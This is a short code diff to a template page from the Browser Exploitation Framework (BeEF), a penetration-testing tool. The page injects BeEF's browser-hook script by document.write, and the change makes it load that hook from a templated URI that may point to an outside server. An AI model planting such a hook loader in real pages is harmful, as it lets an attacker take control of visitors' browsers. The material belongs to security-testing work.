@@ -3,8 +3,13 @@
     Browser Exploitation Framework (BeEF) - http://beefproject.com
     See the file 'doc/COPYING' for copying permission
 -->
+<html>
+<head>
 <script>
-var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '<%= @hook_uri %>" type="text/javascript"><\/script>';
-document.write(commandModuleStr);
+  var commandModuleStr = '<script src="<%= @hook_uri %>" type="text/javascript"><\/script>';
+  document.write(commandModuleStr);
 </script>
-
+</head>
+<body>
+</body>
+</html>
